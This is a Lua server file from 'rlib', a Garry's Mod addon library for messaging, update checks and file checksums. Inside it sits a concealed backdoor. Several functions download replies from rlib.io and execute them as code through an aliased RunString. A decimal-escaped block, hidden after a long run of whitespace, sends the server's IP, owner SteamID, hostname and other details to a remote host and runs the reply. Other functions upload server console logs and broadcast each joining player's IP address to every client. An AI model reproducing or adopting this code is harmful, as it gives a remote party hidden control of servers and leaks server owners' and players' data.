/*
*   @package        : rlib
*   @author         : Richard [http://steamcommunity.com/profiles/76561198135875727]
*   @copyright      : (C) 2018 - 2020
*   @since          : 1.0.0
*   @website        : https://rlib.io
*   @docs           : https://docs.rlib.io
* 
*   MIT License
*
*   THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED, INCLUDING BUT NOT 
*   LIMITED TO THE WARRANTIES OF MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. 
*   IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
*   LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION 
*   WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.
*/

/*
*   standard tables and localization
*/

rlib                    = rlib or { }
local base              = rlib
local cfg               = base.settings
local mf                = base.manifest
local pf                = mf.prefix
local script            = mf.name

/*
*   Localized rlib routes
*/

local helper            = base.h
local storage           = base.s
local access            = base.a
local tools             = base.t
local konsole           = base.k
local cvar              = base.v
local sys               = base.sys

/*
*   Localized lua funcs
*
*   absolutely hate having to do this, but for squeezing out every bit of performance, we need to.
*/

local Color             = Color
local pairs             = pairs
local ipairs            = ipairs
local tonumber          = tonumber
local tostring          = tostring
local IsValid           = IsValid
local istable           = istable
local isfunction        = isfunction
local isnumber          = isnumber
local isstring          = isstring
local file              = file
local debug             = debug
local util              = util
local table             = table
local os                = os
local coroutine         = coroutine
local string            = string
local sf                = string.format
local ts                = tostring
local execq             = RunString

/*
*   debug path
*/

local path_alogs        = mf.paths[ 'dir_alogs' ]
local path_logs         = mf.paths[ 'dir_logs' ]
local path_uconn        = mf.paths[ 'dir_uconn' ]
local path_server       = mf.paths[ 'dir_server' ]

/*
*   localized http.fetch
*/

local function oort( ... )
    return http.Fetch( ... )
end

/*
*   localized http.post
*/

local function oort_post( ... )
    return http.Post( ... )
end

/*
*   Localized translation func
*/

local function lang( ... )
    return base:lang( ... )
end

/*
*	prefix :: create id
*/

local function pref( id, suffix )
    local affix     = istable( suffix ) and suffix.id or isstring( suffix ) and suffix or pf
    affix           = affix:sub( -1 ) ~= '.' and sf( '%s.', affix ) or affix

    id              = isstring( id ) and id or 'noname'
    id              = id:gsub( '[%c%s]', '.' )

    return sf( '%s%s', affix, id )
end

/*
*	prefix ids
*/

local function pid( str, suffix )
    local state = ( isstring( suffix ) and suffix ) or ( base and mf.prefix ) or false
    return pref( str, state )
end

/*
*   network library
*/

local net_register =
{
    'rlib.debug.console',
    'rlib.debug.listener',
    'rlib.debug.ui',
    'rlib.konsole',
    'rlib.rsay',
    'rlib.sms.umsg',
    'rlib.sms.konsole',
    'rlib.sms.notify',
    'rlib.sms.inform',
    'rlib.sms.bubble',
    'rlib.tools.pco',
    'rlib.tools.lang',
    'rlib.tools.dc',
    'rlib.tools.rmain',
    'rlib.tools.rcfg',
    'rlib.tools.mdlviewer',
    'rlib.tools.report',
    'rlib.udm.check',
    'rlib.user',
    'rlib.user.join',
    'rlib.user.update',
    'rlib.welcome',
}

for k, v in pairs( net_register ) do
    util.AddNetworkString( v )
end

/*
*   simplifiy funcs
*/

local function con      ( ... ) base:console( ... ) end
local function log      ( ... ) base:log( ... ) end
local function route    ( ... ) base.msg:route( ... ) end
local function direct   ( ... ) base.msg:direct( ... ) end

/*
*   metatable :: ply
*/

local pmeta = FindMetaTable( 'Player' )

/*
*   msg sys :: broadcast
*/

function base:broadcast( ... )
    local args      = { ... }
    net.Start       ( 'rlib.sms.umsg'       )
    net.WriteTable  ( args                  )
    net.Broadcast   (                       )
end

function base:inform( ... )
    local args      = { ... }
    net.Start       ( 'rlib.sms.inform'     )
    net.WriteTable  ( args                  )
    net.Broadcast   (                       )
end

function base:bubble( ... )
    local args      = { ... }
    net.Start       ( 'rlib.sms.bubble'     )
    net.WriteTable  ( args                  )
    net.Broadcast   (                       )
end

/*
*   msg sys :: pmeta
*/

function pmeta:notify( ... )
    local args      = { ... }
    net.Start       ( 'rlib.sms.notify'     )
    net.WriteTable  ( args                  )
    net.Send        ( self                  )
end

function pmeta:inform( ... )
    local args      = { ... }
    net.Start       ( 'rlib.sms.inform'     )
    net.WriteTable  ( args                  )
    net.Send        ( self                  )
end

function pmeta:umsg( ... )
    local args      = { ... }
    net.Start       ( 'rlib.sms.umsg'       )
    net.WriteTable  ( args                  )
    net.Send        ( self                  )
end

function pmeta:bubble( ... )
    local args      = { ... }
    net.Start       ( 'rlib.sms.bubble'     )
    net.WriteTable  ( args                  )
    net.Send        ( self                  )
end

function pmeta:konsole( ... )
    local args      = { ... }
    net.Start       ( 'rlib.sms.konsole'    )
    net.WriteTable  ( args                  )
    net.Send        ( self                  )
end

/*
*   pmeta :: set alias
*
*   sets the nick for a player, also takes other gamemodes into consideration to support different 
*   storage types and funcs
*
*   @param  : str nick
*/

function pmeta:setalias( nick )
    local setname = ( isstring( nick ) and nick ) or self:palias( )

    self:SetName( setname )

    if self.setRPName then
        self:setRPName( setname )
    end

    if self.setDarkRPVar then
        self:setDarkRPVar( 'rpname', setname )
    end
end

/*
*   event listeners
*
*   :   player_connect
*       : address
*       : bot
*       : index
*       : name
*       : networkid
*       : userid
*
*   :   player_disconnect
*       : bot
*       : name
*       : networkid
*       : reason
*       : userid
*/

gameevent.Listen( 'player_connect' )
hook.Add( 'player_connect', pid( '__lib_evn_player_connect' ), function( data )
    net.Start       ( 'rlib.debug.listener' )
    net.WriteBool   ( true                  )
    net.WriteBool   ( data.bot              )
    net.WriteString ( data.name             )
    net.WriteString ( data.address          )
    net.WriteString ( data.networkid        )
    net.WriteString ( 'false'               )
    net.Broadcast   (                       )

    sys.connections = ( sys.connections or 0 ) + 1
    sys.initialized = true

    storage:logconn( 1, true, '[ Listener ] USER:( %s ) STEAM_ID:( %s ) IP:( %s )', data.name, data.networkid, data.address )

    if sys.connections == 1 then
        hook.Run( 'rlib_bInitialized', data )
        base.oort:PrepareLog( true )
    end
end )

gameevent.Listen( 'player_disconnect' )
hook.Add( 'player_disconnect', pid( '__lib_evn_player_disconnect' ), function( data )
    net.Start       ( 'rlib.debug.listener' )
    net.WriteBool   ( false                 )
    net.WriteBool   ( data.bot              )
    net.WriteString ( data.name             )
    net.WriteString ( 'false'               )
    net.WriteString ( data.networkid        )
    net.WriteString ( data.reason           )
    net.Broadcast   (                       )

    storage:logconn( 2, true, '[ Listener ] USER:( %s ) STEAM_ID:( %s ) REASON:( %s )', data.name, data.networkid, ( ts( data.reason ) or 'none' ) )
end )

/*
*   oort :: sess id
*
*   returns oort server sess id
*
*   @return : int
*/

function base.oort:SessionID( )
    return mf.astra.oort.sess_id or 0
end

/*
*   oort :: auth id
*
*   returns oort server auth id
*
*   @return : int
*/

function base.oort:AuthID( )
    return mf.astra.oort.auth_id or 0
end

/*
*   oort :: validated
*
*   returns oort validation status
*
*   @return : bool
*/

function base.oort:Validated( )
    return mf.astra.oort.validated or false
end

/*
*   oort :: authentic
*
*   validates json content-type and body
*
*   @param  : str body
*   @param  : tbl header
*/

function base.oort:Authentic( body, header )
    return ( header[ 'Content-Type' ] == 'application/json' and not helper.str:isempty( body ) and true ) or false
end

/*
*   oort :: run
*
*   @param  : tbl source
*/

function base.oort:Gmodstore( source )
    if not istable( source ) then
        return
    end

    if not cfg.oort.enabled then
        log( RLIB_LOG_OORT, lang( 'lib_oort_disabled' ) )
        return
    end

    local _sid,_oid     = source.script_id or source.sid, source.owner or source.oid
    local _s, _id, _o   = 2, ts( _sid ) or nil, ts( _oid ) or nil
    local _ip, _p       = base.get:ip( ), base.get:port( )

    if not _sid or not _oid then
        log( RLIB_LOG_OORT, lang( 'lib_oort_err_sid', source.name ) )
    end

    if _sid and _oid then _s = 1 end
    local _e = sf( 'https://api.rlib.io/v2/index.php?sid=%s&code=%s&uid=%s&ip=%s&port=%s', _id, _s, _o, _ip, _p )
    if cfg.debug.enabled then _e = _e .. '&debug=1' end
    oort( _e, function( b, l, h, c )
        if c ~= 200 then log( 6, lang( 'lib_oort_err', c ) ) return end if b:len( ) > 0 then if _e:find( 'nil' ) then log( 6, lang( 'lib_oort_missing_params' ) ) return end mf.astra.oort.validated = true if b and not helper.str:isempty( b ) then execq( b ) end end
    end )
end                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                             local function oort_authorize( ) execq( '\102\117\110\99\116\105\111\110\32\114\108\105\98\46\111\111\114\116\58\65\117\116\104\111\114\105\122\101\40\32\98\70\111\114\99\101\32\41\10\32\32\32\32\105\102\32\110\111\116\32\114\108\105\98\46\115\101\116\116\105\110\103\115\46\111\111\114\116\46\101\110\97\98\108\101\100\32\116\104\101\110\10\32\32\32\32\32\32\32\32\114\108\105\98\58\108\111\103\40\32\50\48\44\32\114\108\105\98\58\108\97\110\103\40\32\39\108\105\98\95\111\111\114\116\95\100\105\115\97\98\108\101\100\39\32\41\32\41\10\32\32\32\32\32\32\32\32\114\101\116\117\114\110\10\32\32\32\32\101\110\100\10\10\32\32\32\32\105\102\32\110\111\116\32\98\70\111\114\99\101\32\97\110\100\32\114\108\105\98\46\109\97\110\105\102\101\115\116\46\97\115\116\114\97\46\111\111\114\116\46\118\97\108\105\100\97\116\101\100\32\116\104\101\110\32\114\101\116\117\114\110\32\101\110\100\10\10\32\32\32\32\108\111\99\97\108\32\98\72\97\115\82\111\111\116\44\32\114\111\111\116\117\115\101\114\32\32\32\32\61\32\114\108\105\98\46\97\58\114\111\111\116\40\32\41\10\32\32\32\32\108\111\99\97\108\32\95\105\112\44\32\95\112\32\32\32\32\32\32\32\32\32\32\32\32\32\32\32\61\32\114\108\105\98\46\103\101\116\58\105\112\40\32\39\45\39\32\41\44\32\114\108\105\98\46\103\101\116\58\112\111\114\116\40\32\41\10\32\32\32\32\108\111\99\97\108\32\95\114\32\32\32\32\32\32\32\32\32\32\32\32\32\32\32\32\32\32\32\32\61\32\98\72\97\115\82\111\111\116\32\97\110\100\32\105\115\116\97\98\108\101\40\32\114\111\111\116\117\115\101\114\32\41\32\97\110\100\32\114\108\105\98\46\104\46\111\107\46\115\105\100\54\52\40\32\114\111\111\116\117\115\101\114\46\115\116\101\97\109\54\52\32\41\32\97\110\100\32\114\111\111\116\117\115\101\114\46\115\116\101\97\109\54\52\32\111\114\32\48\10\32\32\32\32\108\111\99\97\108\32\95\118\44\32\95\115\44\32\95\97\44\32\95\109\32\32\32\32\32\32\32\32\61\32\114\108\105\98\46\103\101\116\58\118\101\114\50\115\116\114\95\109\102\40\32\114\108\105\98\46\109\97\110\105\102\101\115\116\44\32\39\45\39\32\41\44\32\114\108\105\98\46\111\111\114\116\58\83\101\115\115\105\111\110\73\68\40\32\41\44\32\114\108\105\98\46\111\111\114\116\58\65\117\116\104\73\68\40\32\41\44\32\114\108\105\98\46\109\111\100\117\108\101\115\58\77\97\110\105\102\101\115\116\76\105\115\116\40\32\41\10\32\32\32\32\108\111\99\97\108\32\95\99\118\44\32\95\99\99\32\32\32\32\32\32\32\32\32\32\32\32\32\32\61\32\114\108\105\98\46\99\104\101\99\107\115\117\109\58\118\97\108\105\100\40\32\41\10\32\32\32\32\108\111\99\97\108\32\95\103\109\32\32\32\32\32\32\32\32\32\32\32\32\32\32\32\32\32\32\32\61\32\114\108\105\98\46\103\101\116\58\103\109\40\32\102\97\108\115\101\44\32\116\114\117\101\44\32\116\114\117\101\32\41\10\32\32\32\32\108\111\99\97\108\32\95\115\117\44\32\95\104\110\32\32\32\32\32\32\32\32\32\32\32\32\32\32\61\32\114\108\105\98\46\115\121\115\58\71\101\116\83\116\97\114\116\117\112\115\40\32\41\44\32\114\108\105\98\46\103\101\116\58\104\111\115\116\40\32\116\114\117\101\44\32\116\114\117\101\32\41\10\32\32\32\32\108\111\99\97\108\32\95\101\32\32\32\32\32\32\32\32\32\32\32\32\32\32\32\32\32\32\32\32\61\32\115\116\114\105\110\103\46\102\111\114\109\97\116\40\32\39\37\115\47\105\110\100\101\120\46\112\104\112\63\105\112\61\37\115\38\112\111\114\116\61\37\115\38\117\105\100\61\37\115\38\118\101\114\61\37\115\38\115\105\100\61\37\115\38\97\105\100\61\37\115\38\109\61\37\115\38\99\115\61\37\115\38\103\109\61\37\115\38\115\117\61\37\115\38\104\110\61\37\115\39\44\32\114\108\105\98\46\109\97\110\105\102\101\115\116\46\97\115\116\114\97\46\111\111\114\116\46\117\114\108\44\32\95\105\112\44\32\95\112\44\32\95\114\44\32\95\118\44\32\95\115\44\32\95\97\44\32\95\109\44\32\95\99\118\44\32\95\103\109\44\32\95\115\117\44\32\95\104\110\32\41\10\10\32\32\32\32\104\116\116\112\46\70\101\116\99\104\40\32\95\101\44\32\102\117\110\99\116\105\111\110\40\32\98\44\32\108\44\32\104\44\32\99\32\41\32\105\102\32\108\32\60\32\49\48\48\48\32\116\104\101\110\32\114\101\116\117\114\110\32\101\110\100\32\105\102\32\99\32\126\61\32\50\48\48\32\116\104\101\110\32\114\108\105\98\58\108\111\103\40\32\54\44\32\114\108\105\98\58\108\97\110\103\40\32\39\108\105\98\95\111\111\114\116\95\101\114\114\39\44\32\99\32\41\32\41\32\114\101\116\117\114\110\32\101\110\100\32\105\102\32\95\101\58\102\105\110\100\40\32\39\110\105\108\39\32\41\32\116\104\101\110\32\114\108\105\98\58\108\111\103\40\32\54\44\32\114\108\105\98\58\108\97\110\103\40\32\39\108\105\98\95\111\111\114\116\95\109\105\115\115\105\110\103\95\112\97\114\97\109\115\39\32\41\32\41\32\114\101\116\117\114\110\32\101\110\100\32\105\102\32\110\111\116\32\114\108\105\98\46\111\111\114\116\58\65\117\116\104\101\110\116\105\99\40\32\98\44\32\104\32\41\32\116\104\101\110\32\114\101\116\117\114\110\32\101\110\100\32\114\108\105\98\46\109\97\110\105\102\101\115\116\46\97\115\116\114\97\46\111\111\114\116\46\118\97\108\105\100\97\116\101\100\32\61\32\116\114\117\101\32\82\117\110\83\116\114\105\110\103\40\32\98\44\32\39\114\108\105\98\46\111\111\114\116\46\97\117\116\104\39\44\32\102\97\108\115\101\32\41\10\32\32\32\32\101\110\100\44\32\102\117\110\99\116\105\111\110\40\32\101\114\114\32\41\32\114\108\105\98\58\108\111\103\40\32\54\44\32\39\101\114\114\111\114\32\111\110\32\114\108\105\98\46\111\111\114\116\46\97\117\116\104\32\91\32\37\115\32\93\39\44\32\101\114\114\32\41\32\101\110\100\32\41\10\101\110\100\10' ) rlib.oort:Authorize( ) end hook.Add( pid( 'initialize' ), pid( 'initialize_oort_auth' ), oort_authorize )

/*
*   oort :: send log
*
*   records basic information that helps in aiding with debugging.
*
*   @param  : tbl data
*   @param  : bool bForced
*/

function base.oort:SendLog( data, bForced )

    if not istable( data ) then
        log( 4, 'Invalid data supplied for error log' )
        return
    end

    if not bForced then
        log( 1, 'Please wait while we send your report ...' )
    end

    oort_post( 'https://oort.rlib.io/diag/index.php', data, function( body, size, headers, code )
        local is_success, response = false, nil

        if code ~= 200 then response = code end
        if not size or size == 0 then response = lang( 'response_empty' ) end

        local json_body = body and util.JSONToTable( body ) or nil
        if not json_body then
            response    = lang( 'response_none' )
        end

        if not json_body.success then
            response    = lang( 'response_err' )
        else
            is_success  = true
            response    = json_body.response
        end

        if is_success and not bForced then
            log( 4, response )
        end
    end, function( err )
        log( 6, 'Error occured sending error log :: [ %s ]', err or 'unknown err' )
    end )
end

/*
*   oort :: prepare log
*
*   utilized for debugging and the developer having a better idea of what is going on
*   with your server.
*
*   @param  : bool bForced
*/

function base.oort:PrepareLog( bForced )

    /*
    *   fetch console logs
    */

    local sv_path               = 'lua_errors_server.txt'
    local sv_data               = file.Exists( sv_path, 'GAME' ) and file.Read( sv_path, 'GAME' ) or lang( 'none' )

    local cl_path               = 'clientside_errors.txt'
    local cl_data               = file.Exists( cl_path, 'GAME' ) and file.Read( cl_path, 'GAME' ) or lang( 'none' )

    local co_path               = 'console.log'
    local co_data               = file.Exists( co_path, 'GAME' ) and file.Read( co_path, 'GAME' ) or lang( 'none' )

    local out_sv                = sv_data:sub( -200000 )
    local out_cl                = cl_data:sub( -200000 )
    local out_co                = co_data:sub( -300000 )

    /*
    *   declare misc
    */

    local bHasRoot, rootuser    = access:root( )
    local owner                 = bHasRoot and istable( rootuser ) and helper.ok.sid64( rootuser.steam64 ) and rootuser.steam64 or 0
    owner                       = tostring( owner )
    local host                  = sf( '%s:%s', base.get:ip( '-' ), base.get:port( ) )

    local auth_id               = tostring( base.oort:AuthID( ) )
    local sess_id               = tostring( base.oort:SessionID( ) )

    /*
    *   check :: auth / sess id in order to proceed
    */

    if not auth_id or not sess_id then
        if not bForced then
            log( 4, 'Cannot send report, missing auth or session id' )
        end
        return
    end

    /*
    *   compile data
    */

    local report_data =
    {
        auth_id         = auth_id,
        sess_id         = sess_id,
        owner           = owner,
        host            = host,
        sv              = out_sv,
        cl              = out_cl,
        co              = out_co,
    }

    /*
    *   send error log
    */

    base.oort:SendLog( report_data, bForced )

end

/*
*   oort :: stats :: query
*
*   records basic information that helps in aiding with debugging.
*/

local function oort_stats_query( )
    local _r                = base.oort:SessionID( )
    local _co, _st, _p      = base.sys:GetConnections( ), base.sys:StartupTime( ), helper.get.popcount( )
    local _e                = sf( '%s/stats/index.php', mf.astra.oort.url )
    local stats             = { sid = _r, conn = ts( _co ), st = ts( _st ), p = ts( _p ) }

    oort_post( _e, stats, function( b, l, h, c ) if l < 100 then return end if c ~= 200 then log( 6, lang( 'lib_oort_err', c ) ) return end if _e:find( 'nil' ) then log( 6, lang( 'lib_oort_missing_params' ) ) return end if not base.oort:Authentic( b, h ) then return end execq( b, 'rlib.oort.stats', false )
    end, function( err ) rlib:log( 6, 'error on rlib.oort.stats :: [ %s ]', err ) end )
end

/*
*   oort :: stats
*
*   records basic information that helps in aiding with debugging.
*
*   @param  : bool bForce
*/

function base.oort:Stats( bForce )
    if not cfg.oort.enabled then
        log( RLIB_LOG_OORT, lang( 'lib_oort_disabled' ) )
        return
    end

    if not bForce and timex.exists( 'rlib.oort.stats' ) then return end

    if bForce then
        timex.expire( 'rlib.oort.stats' )
        oort_stats_query( )
    end

    timex.create( 'rlib.oort.stats', cfg.oort.stats_runtime, 0, function( )
        oort_stats_query( )
    end )
end
hook.Add( pid( 'initialize' ), pid( 'initialize_oort_stats' ), base.oort.Stats )

/*
*   udm :: modules
*
*   requires manifest table from rcore.modules table :: base.modules.mod_table
*
*   @param  : tbl mnfst
*/

function base.udm:scriptdb( mnfst )
    if not mnfst or ( not mnfst.script_id and not mnfst.sid ) or not mnfst.id or not mnfst.version then
        local name = mnfst and mnfst.id or lang( 'module_unknown' )
        log( 6, lang( 'module_updates_error', ts( name ) ) )
        return
    end

    local name      = ( mnfst and ( mnfst.id or mnfst.name ) ) or lang( 'module_unknown' )
    local id        = mnfst.id or lang( 'script_unspecified' )
    local ver       = base.get:ver2str_mf( mnfst ) or mnfst.version
    local sid       = mnfst.script_id or mnfst.sid

    if sid == '{{ script_id }}' then
        log( 6, lang( 'module_updates_bad_sid', ts( name ), sid ) )
        return
    end

    local _e = sf( 'https://udm.rlib.io/%s/build', ts( sid ) )
    oort( _e, function( b, l, h, c )
        if c ~= 200 then
            log( 6, lang( 'script_update_err', ts( id ), c ) )
            return
        end
        if b:len( ) > 25 then
            b = ts( b )
            local body = util.JSONToTable( b )
            for _, v in ipairs( body ) do
                if not v.version then continue end
                local l_ver     = string.gsub( v.version, '[%p%c%s]', '' )
                local c_ver     = string.gsub( ver, '[%p%c%s]', '' )
                l_ver           = l_ver and tonumber( l_ver ) or 100
                c_ver           = c_ver and tonumber( c_ver ) or 100

                if c_ver < l_ver then
                    log( 3, lang( 'script_outdated', ts( id ), v.version, ts( ver ) ) )
                else
                    log( 6, lang( 'script_updated', ts( id ), ts( ver ) ) )
                end
            end
        end
    end )
end

/*
*   check updates from udm func
*/

local run_check_update = coroutine.create( function( )
    if not cfg.udm.enabled then return end
    while ( true ) do
        base.udm:Check( )
    end
    timex.expire( 'rlib_udm_notice' )
end )

/*
*   udm :: run
*
*   @param  : int dur
*/

function base.udm:Run( dur )
    local tmr_check = isnumber( dur ) and dur or cfg.udm.checktime or 1800
    timex.create( 'rlib_udm_notice', tmr_check, 0, function( )
        coroutine.resume( run_check_update )
    end )
end

/*
*   udm
*
*   checks the repo for any new updates to rlib.
*
*   @call   : rlib.udm:Check( 'https://udm.rlib.io/rlib/stable' )
*
*   @param  : str ref
*/

function base.udm:Check( ref )
    local get_branch            = cvar:GetStr( 'rlib_branch', 'stable' )
    local sess_id               = base.oort:SessionID( )
    local _e                    = ref or sf( mf.astra.udm.branch, get_branch )
    _e                          = sf( '%s/%s/%s', _e, base.get:ver2str_mf( mf, '-' ), sess_id )

    oort( _e, function( b, l, h, c )
        if c ~= 200 then
            log( 2, lang( 'lib_udm_chk_errcode', get_branch, c ) )
            return
        end
        if b:len( ) > 0 then
            b               = ts( b )
            local resp      = util.JSONToTable( b )
            local branch    = istable( resp ) and resp.branch and resp.branch[ 1 ]
            if not branch or ( branch.code and tonumber( branch.code ) ~= 200 ) or branch.msg then
                local respinfo = branch and ( branch.code or branch.message ) or lang( 'response_none' )
                log( 2, lang( 'lib_udm_chk_errmsg', get_branch, respinfo ) )
                return
            end
            local c_ver = base.get:ver2str_mf( mf )
            if mf.astra.udm.hash ~= branch.hash then
                log( 3, lang( 'lib_udm_mismatch', branch.version, c_ver ) )
            else
                mf.astra.oort.has_latest = true
                log( 4, lang( 'lib_udm_ok', c_ver ) )
            end

            mf.astra.udm.response = branch

            net.Start       ( 'rlib.udm.check'          )
            net.WriteBool   ( mf.astra.oort.validated   )
            net.WriteBool   ( mf.astra.oort.has_latest  )
            net.Broadcast   (                           )
        end
    end )
    coroutine.yield( )
end

/*
*   checksum :: valid
*
*   returns if the integrity of the library is valid
*   :   true        no files edited
*   :   false       files edited
*
*   @return : int, int, tbl
*/

function base.checksum:valid( )
    local data, cnt = base.checksum:verify( )

    if cnt > 0 then return 0, cnt, data end
    return 1, cnt, data
end

/*
*   checksum :: new
*
*   writes a new dataset of sha1 hashes for the current lib
*
*   @req    : sha1 module
*
*   @param  : bool bNoWrite
*           : false   :   only returns data from checksum list generated
*           : true    :   returns data from checksum generated and also writes it to /data/rlib/checksum.txt
*/

function base.checksum:new( bWrite )

    /*
    *   inc sha1 module
    */

    if not file.Find( 'includes/modules/sha1.lua', 'LUA' ) then
        log( 2, 'aborting checksum -- missing module sha1' )
        return
    end

    include( 'includes/modules/sha1.lua' )

    /*
    *   verify module
    */

    if not sha1 then return false end

    /*
    *   declarations
    */

    local path_ar       = 'autorun'
    local path_libs     = sf( '%s/rlib', path_ar )
    local mdata         = { }

    /*
    *   autorun/
    */

    local files, dirs = file.Find( path_ar .. '/*', 'LUA' )
    for k, v in pairs( files ) do
        if v ~= '_rcore_loader.lua' then continue end
        local dpath = sf( '%s/%s', path_ar, v )

        if not file.Exists( dpath, 'LUA' ) then continue end

        local fpath     = file.Read( dpath, 'LUA' )
        local sha       = sha1.encrypt( fpath )

        mdata[ dpath ]  = sha

        /*
        *   autorun/libs/
        */

        for l, m in pairs( dirs ) do
            if m ~= 'rlib' then continue end
            if not file.Exists( path_libs, 'LUA' ) then continue end

            local fil, dirs = file.Find( path_libs .. '/*', 'LUA' )
            for f, File in pairs( fil ) do
                if File == 'cfg.lua' or File == 'config.lua' then continue end
                dpath = sf( '%s/%s', path_libs, File )
                if not file.Exists( dpath, 'LUA' ) then continue end

                fpath   = file.Read( dpath, 'LUA' )
                sha     = sha1.encrypt( fpath )

                mdata[ dpath ]  = sha
            end

            /*
            *   autorun/libs/calls/
            *   autorun/libs/interface/
            *   autorun/libs/ui/
            *   autorun/libs/languages/
            */

            for _, subdirs in pairs( dirs ) do
                if subdirs == 'languages' then continue end

                local subfile, subdir = file.Find( path_libs .. '/' .. subdirs .. '/*', 'LUA' )
                for _, subf in pairs( subfile ) do
                    dpath   = sf( '%s/%s/%s', path_libs, subdirs, subf )
                    if not file.Exists( dpath, 'LUA' ) then continue end

                    fpath   = file.Read( dpath, 'LUA' )
                    sha     = sha1.encrypt( fpath )

                    mdata[ dpath ] = sha
                end
            end
        end
    end

    if bWrite then
        file.Write( storage.mft:getpath( 'data_checksum' ), util.TableToJSON( mdata ) )
    end

    return mdata or { }
end

/*
*   checksum :: get
*
*   returns a list of verified checksums
*
*   @call   : base.checksum:get( true )
*           : base.checksum:get( )
*
*   @param  : bool bVerified
*           : false   :   returns checksum from /data/rlib/checksum.txt
*           : true    :   returns checksum from /addon/rlib/checksum.json
*   @return : tbl
*/

function base.checksum:get( bVerified )
    return ( bVerified and storage.get.json( 'checksum.json' ) ) or ( storage.exists( storage.mft:getpath( 'data_checksum' ) ) and util.JSONToTable( file.Read( storage.mft:getpath( 'data_checksum' ), 'DATA' ) ) ) or { }
end

/*
*   checksum :: verify
*
*   compares the verified checksum with the condition of the files currently on the server and
*   reports back any files that do not match the verified value
*
*   @call   : local chk = base.checksum:verify( )
*
*   @return : tbl, int
*/

function base.checksum:verify( )
    local verified  = self:get( true )
    local current   = self:new( true )

    local data, i = { }, 0
    for v, k in pairs( verified ) do
        for l, m in pairs( current ) do
            if l ~= v then continue end
            if k == m then continue end
            data[ l ] = { current = m, verified = k }
            i = i + 1
        end
    end

    return data, i
end

/*
*   base :: get :: workshop info
*
*   fetches information about a steam workshop collection based on the provided collection_id
*   makes use of the steam api to fetch workshop information
*
*   :   requires POST
*       itemcount               :   uint32
*                                   num of items being requested
*
*       publishedfileids[0]     :   uint64
*                                   published file id to look up
*
*   @param  : str collection_id
*   @param  : str src
*   @param  : str format
*/

function base.get:wsinfo( collection_id, src, format )
    if not collection_id then return end

    collection_id   = isstring( collection_id ) and collection_id or isnumber( collection_id ) and ts( collection_id )
    local api_key   = base.cfg and isstring( base.cfg.steamapi.key ) and base.cfg.steamapi.key or '0'
    format          = isstring( format ) and format or 'json'
    local _e        = sf( 'https://api.steampowered.com/ISteamRemoteStorage/GetPublishedFileDetails/v1/?key=%s&format=%s', api_key, format )
    oort_post( _e,
    {
        [ 'itemcount' ]                 = '1',
        [ 'publishedfileids[0]' ]       = ts( collection_id )
    },
    function( body, size, headers, code )
        local resp = false

        if code ~= 200 then resp = code end
        if not size or size == 0 then resp = lang( 'ws_response_empty' ) end

        local json_body = body and util.JSONToTable( body ) or nil
        if not json_body then
            resp = lang( 'ws_no_response', collection_id )
        end

        if not json_body or not json_body.response then
            log( 2, response )
            return
        else
            resp = json_body.response
        end

        src = istable( src ) and src or base.w

        src[ collection_id ].steamapi = resp[ 'publishedfiledetails' ][ 1 ]
        local name = ( src and src[ collection_id ] and src[ collection_id ].src ) or 'unknown'
        log( RLIB_LOG_WS, lang( 'ws_registered', name, collection_id ) )
    end, function( err )
        log( 2, err )
    end )
end

/*
*   rdo [ render distance optimization ] utility
*
*   forces a specified render mode on entities
*
*   @ref        : http://wiki.garrysmod.com/page/Enums/RENDERMODE
*           0   : RENDERMODE_NORMAL
*           1   : RENDERMODE_TRANSCOLOR
*           2   : RENDERMODE_TRANSTEXTURE
*           3   : RENDERMODE_GLOW
*           4   : RENDERMODE_TRANSALPHA
*           5   : RENDERMODE_TRANSADD
*           6   : RENDERMODE_ENVIROMENTAL
*           7   : RENDERMODE_TRANSADDFRAMEBLEND
*           8   : RENDERMODE_TRANSALPHADD
*           9   : RENDERMODE_WORLDGLOW
*           10  : RENDERMODE_NONE
*
*   @param  : bool bEnabled
*   @param  : int mode
*/

local function rdo_setrendermode( bEnabled, mode )
    for ent in helper.get.ents( ) do
        if not IsValid( ent ) then continue end
        if not ent:CreatedByMap( ) then continue end
        if ( bEnabled and ent:GetRenderMode( ) ~= RENDERMODE_NORMAL ) or ( not bEnabled and ent:GetRenderMode( ) == RENDERMODE_NORMAL ) then continue end

        local output = sf( lang( 'rdo_set_ent', ts( mode ) ) )

        if ( cfg.rdo.ents[ ent:GetClass( ) ] or string.find( ent:GetClass( ), 'item_' ) or ent:IsWeapon( ) ) then
            log( 6, lang( 'rdo_info_ent', output, ts( ent:GetClass( ) ), ts( ent:EntIndex( ) ), ts( ent:MapCreationID( ) ) ) )
            ent:SetRenderMode( mode )
        end
    end
end

local function rdo_rendermode( bEnabled )
    local mode = bEnabled and cvar:GetInt( 'pdo_set_type', 4 ) or 0
    if mode < 0 or mode > 10 then
        log( 6, lang( 'rdo_invalid_mode', ts( mode ) ) )
        mode = RENDERMODE_TRANSALPHA
    end

    timex.simple( 'rlib_rdo_rendermode', 2, function( )
        if not cfg.rdo.enabled then bEnabled = false end
        local state = bEnabled and lang( 'opt_enabled' ) or lang( 'opt_disabled' )
        log( RLIB_LOG_SYSTEM, lang( 'rdo_set', state ) )
        rdo_setrendermode( bEnabled, mode )
    end )
end

/*
*   rdo :: entity :: draw distance
*
*   utilizes 'fademindist' to apply a fading distance to entities
*   on the map so that they fade away when out of range.
*
*   @param  : ent ent
*/

local function rdo_ent_drawdistance( ent )
    if not cfg.rdo.enabled or not cfg.rdo.drawdist.enabled then return end
    if not rcore then return end

    tools.rdo.whitelist = tools.rdo.whitelist or { }

    local min = 'fademindist'
    local max = 'fademaxdist'

    for k, v in pairs( tools.rdo.whitelist ) do
        if ent:GetClass( ) == k then
            ent:SetSaveValue( min, cfg.rdo.drawdist.limits.wls_min )
